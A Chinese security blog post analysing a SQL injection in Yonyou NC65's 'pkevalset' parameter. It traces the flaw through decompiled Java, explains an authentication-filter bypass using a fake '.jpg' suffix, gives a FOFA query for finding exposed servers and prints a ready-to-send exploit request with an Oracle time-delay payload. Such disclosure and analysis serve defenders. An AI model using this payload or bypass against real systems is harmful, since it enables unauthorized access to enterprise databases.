---
title: "用友NC pkevalset SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-evalschedule-pkevalset-sqli.html
---

# 用友NC pkevalset SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/26 08:41
* 1456浏览
* [0评论](#comment)
* 1小时
  阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友")
NC 是一种商业级的企业资源规划，为企业提供全面的管理解决方案，包括财务管理、采购管理、销售管理、人力资源管理等功能，基于云原生架构，深度应用新一代数字技术，打造开放、 互联、融合、智能的一体化云平台，支持公有云、混合云、专属云的灵活部署模式。聚焦数字化管理、数字化经营、数字化平台等三大企业数字化转型战略方向，提供涵盖数字营销、智能制造、财务共享、人力共享与协同，智慧采购、数字中台等18大解决方案，助力大型企业全面落地数字化和业务流程优化。用友NC电子商务平台的
`pkevalset`
参数存在
[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

# 影响版本

NC65

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

先看对应的过滤

nc/bs/ebvppub/filter/EbvpRequestFilter.java

```
public void init(FilterConfig arg0) throws ServletException {
    this.listNoNeedLoginUrl.add("/ebvp");
    this.listNoNeedLoginUrl.add("/ebvp/");
    this.listNoNeedLoginUrl.add("/ebvp/index.jsp");
    this.listNoNeedLoginUrl.add("/ebvp/randomid");
    this.listNoNeedLoginUrl.add("/ebvp/lostpwd");
    this.listNoNeedLoginUrl.add("/ebvp/infopub/purannouncenologin");
    this.listNoNeedLoginUrl.add("/ebvp/infopub/purannounceajax");
    this.listNoNeedLoginUrl.add("/ebvp/infopub/showcontent");
    this.listNoNeedLoginUrl.add("/ebvp/infopub/viewpurtrendsnologin");
    this.listNoNeedLoginUrl.add("/ebvp/infopub/viewpurtrendsajax");
    this.listNoNeedLoginUrl.add("/ebvp/infopub/viewlawrulenologin");
    this.listNoNeedLoginUrl.add("/ebvp/infopub/viewlawruleajax");
    this.listNoNeedLoginUrl.add("/ebvp/expeval/login");
    this.listNoNeedLoginUrl.add("/ebvp/expeval/loginsubmit");
    this.listNoNeedLoginUrl.add("/ebvp/sourcingcoll/FileUpload_new.jsp");
    this.listNoNeedLoginUrl.add("/ebvp/pushlet.srv");
    this.listNoNeedLoginPatchUrl.add("/ebvp/login/");
    this.listNoNeedLoginPatchUrl.add("/ebvp/schedulecoll/langtrconller/");
    this.listNoNeedLoginPatchUrl.add("/ebvp/register/");
    this.listNoNeedLoginPatchUrl.add("/ebvp/index/");
    this.listNoNeedLoginPatchUrl.add("/ebvp/ebvpfile/");
    this.staticResourceSuffixes.add(".js");
    this.staticResourceSuffixes.add(".css");
    this.staticResourceSuffixes.add(".json");
    this.staticResourceSuffixes.add(".html");
    this.staticResourceSuffixes.add(".png");
    this.staticResourceSuffixes.add(".gif");
    this.staticResourceSuffixes.add(".jpg");
    this.staticResourceSuffixes.add(".icon");
    this.staticResourceSuffixes.add(".tpl");
}
```

我们只需要 URL 里有这些后缀或者url 就可以绕过权限校验

根据官方漏洞通告

![用友NC pkevalset SQL注入漏洞](https://image.mrxn.net/ec954ffbb28d4b1abfc25c89d361372a.webp)

直接看
`EvalScheduleController.java`
的业务逻辑处理

```
package nc.bs.ebvp.expeval;

import java.util.List;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import nc.bs.ebvp.expeval.form.EvalScheFormUtil;
import nc.bs.ebvp.expeval.form.EvalScheduleForm;
import nc.bs.ebvppub.ebvpservicefactory.NCLocatorFactory;
import nc.bs.ebvppub.tools.DefualtPageBarInfo;
import nc.itf.ebvp.expeval.service.IEvalListQueryService;
import nc.itf.ebvp.expeval.service.IEvalScheduleQueryService;
import nc.vo.ebvp.evalset.pojo.AggEvalSetPOJO;
import nc.vo.ebvp.expertbasdoc.pojo.ExpertBasDocPOJO;
import nc.vo.ecpubapp.pattern.data.DefaultPageInfo;
import nc.vo.ecpubapp.pattern.log.Log;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;

@Controller
public class EvalScheduleController {

@RequestMapping(value={"/expertschedule"}, method={RequestMethod.GET})
public String expertSchedule(HttpServletRequest request, HttpServletResponse response) {
    String pkEvalSet = request.getParameter("pkevalset");
    ExpertBasDocPOJO expVO = (ExpertBasDocPOJO)request.getSession().getAttribute("EC_EXPERTEVAL_USERVO");
    IEvalScheduleQueryService service = (IEvalScheduleQueryService)NCLocatorFactory.getInstance().getEbvpNCLocator().lookup(IEvalScheduleQueryService.class);
    try {
        AggEvalSetPOJO aggEvalSetVo = service.getEvalSetScheInfoByPk(pkEvalSet);
        EvalScheduleForm scheForm = EvalScheFormUtil.convertVO2Form(aggEvalSetVo, expVO);
        request.setAttribute("EXPERTEVAL_EVALSCHEDULEDETAIL", (Object)scheForm);
    }
    catch (Exception e) {
        Log.getInstance().error((Throwable)e);
        request.setAttribute("EXCEPTION_ERROR", (Object)e);
        return "experteval/error";
    }
    return "experteval/expertschedule";
}
}
```

`pkEvalSet`
带入
`service.getEvalSetScheInfoByPk`

```
public class EvalScheduleQueryServiceImpl
implements IEvalScheduleQueryService {
    public AggEvalSetPOJO getEvalSetScheInfoByPk(String pkEvalSet) throws BusinessException {
        IEvalSetWsQueryService service = (IEvalSetWsQueryService)NCLocator.getInstance().lookup(IEvalSetWsQueryService.class);
        AggEvalSetVO aggVo = service.getEvalSetScheInfoByPk(pkEvalSet);
        AggEvalSetPOJO retVo = (AggEvalSetPOJO)DataVOCopyUtils.ebpurtoebvpAggCopy((Object)aggVo, AggEvalSetPOJO.class);
        return retVo;
    }
```

```
public AggEvalSetVO getEvalSetScheInfoByPk(String pkEvalSet) throws BusinessException {
    Object[] objs = this.queryMDVOByPks(EvalSetVO.class, new String[]{pkEvalSet}, null);
    if (objs == null || objs.length == 0) {
        return null;
    }
```

```
public Object[] queryMDVOByPks(Class parentCls, String[] pks, DefaultTransBizExtContext transContext) throws BusinessException {
    SuperVO parentVO;
    try {
        parentVO = (SuperVO)parentCls.newInstance();
    }
    catch (Exception e) {
        Log.getInstance().error((Throwable)e);
        String message = NCLangResOnserver.getInstance().getStrByID("ec20010_0", "0ec20010-000287");
        throw new BusinessException(message);
    }
    SqlBuilder strWhere = new SqlBuilder();
    strWhere.append(parentVO.getPKFieldName(), pks);
    List list = (List)MDPersistenceService.lookupPersistenceQueryService().queryBillOfVOByCond(parentCls, strWhere.toString(), true, false);
```

![用友NC pkevalset SQL注入漏洞](https://image.mrxn.net/25a18ac5757f45aea004c670b8abefe7.webp)

![用友NC pkevalset SQL注入漏洞](https://image.mrxn.net/ec854514d02048a4b5017edadffa00ef.webp)

![用友NC pkevalset SQL注入漏洞](https://image.mrxn.net/9b65551ae37e453f8e1f4a14746550a8.webp)

最终通过GET请求，将
`pkevalset`
参数值拼接进SQL语句where子语句中调用 executeQuery 直接执行，无任何过滤或校验造成SQL注入
[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
，朴实无华。

# 漏洞复现

![用友NC pkevalset SQL注入漏洞](https://image.mrxn.net/ce2be8cf627040bb846ada364cdf104f.webp)

漏洞利用示例

```
GET /ebvp/expeval/expertschedule;1.jpg?pkevalset=1'+OR+1111%3d(SELECT+COUNT(*)+FROM+ALL_USERS+T1,ALL_USERS+T2,ALL_USERS+T3,ALL_USERS+T4,ALL_USERS+T5)-- HTTP/1.1
HTTP/1.1
Host: nc65.mrxn.net
```

![用友NC pkevalset SQL注入漏洞](https://image.mrxn.net/d2e51f10ca354605a5c7d736e3980435.webp)

# 参考

* `https://security.yonyou.com/#/noticeInfo?id=481`
* `https://www.iufida.com/313-151713-0.html#download`
* `https://mp.weixin.qq.com/s/_Vn1Zkil3umediyv2KKeUw`

* 标签：
* [#
  漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#
  web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#
  SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#
  代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#
  Java](https://mrxn.net/tag/Java)
* [#
  用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录

×



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：
[Mrxn's Blog](https://mrxn.net/)
  
文章标题：
[用友NC pkevalset SQL注入漏洞](https://mrxn.net/jswz/yonyou-nc-evalschedule-pkevalset-sqli.html)
  
文章链接：
<https://mrxn.net/jswz/yonyou-nc-evalschedule-pkevalset-sqli.html>
  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

设备上扫码阅读



var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-evalschedule-pkevalset-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

手机扫码阅读



var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-evalschedule-pkevalset-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});